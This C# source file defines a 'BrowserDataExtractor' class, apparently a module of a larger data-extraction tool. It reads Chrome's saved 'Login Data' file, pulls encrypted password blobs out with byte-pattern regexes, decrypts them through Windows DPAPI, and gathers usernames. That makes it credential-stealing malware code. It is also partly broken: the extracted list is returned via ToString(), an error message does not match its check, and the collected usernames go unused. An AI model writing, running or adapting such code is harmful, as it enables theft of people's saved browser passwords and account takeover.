using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace TP
{
    public class BrowserDataExtractor : DataExtractor
    {

        public BrowserDataExtractor()
        {
            fileName = "browserData";
        }

        protected override string ExtractData()
        {
            List<string> password = GetBrowserData();
            return password.ToString();
        }

        private List<string> GetBrowserData()
        {
            var pathWithEnv = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data";
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);

            if (filePath == null)
                Console.Error.WriteLine("Failed to get ProductName from registry");
            FileStream fs = File.Open(filePath, FileMode.OpenOrCreate, FileAccess.ReadWrite,FileShare.None);
            var encoding = System.Text.Encoding.GetEncoding(28591);
            StreamReader streamReader = new StreamReader(fs, encoding);
            var binaryText = streamReader.ReadToEnd();
            streamReader.Close();
            fs.Close();

            Regex pwdRegex = new Regex(@"(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70|\Z)");
            var pwdMatches = pwdRegex.Matches(binaryText);
            var pwdNum = 0;
            List<string> decPwdArray = new List<string>();

            foreach (var pwd in pwdMatches)
            {
                var pwdEncoded = encoding.GetBytes(pwd.ToString());
                var decrypt = ProtectedData.Unprotect(pwdEncoded, null, DataProtectionScope.CurrentUser);
                var decPwd = Encoding.Default.GetString(decrypt);
                decPwdArray.Add(decPwd);
            }

            Regex userRegex = new Regex(@"(?<=\x0D\x0D\x0D[\s\S]{2,4}\x68\x74\x74\x70)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)");
            var usrMatches = userRegex.Matches(binaryText);
            var userMatchCount = usrMatches.Count;

            if (usrMatches.Count != pwdMatches.Count)
            {
                Console.Error.WriteLine("Regex Mismatch");
            }

            List<string> usr = new List<string>();

            foreach (var user in usrMatches)
            {
                var usrEncoded = encoding.GetBytes(user.ToString());
                var decPwd = Encoding.Default.GetString(usrEncoded);
                usr.Add(decPwd);
            }




            return decPwdArray;
        }
    }
}
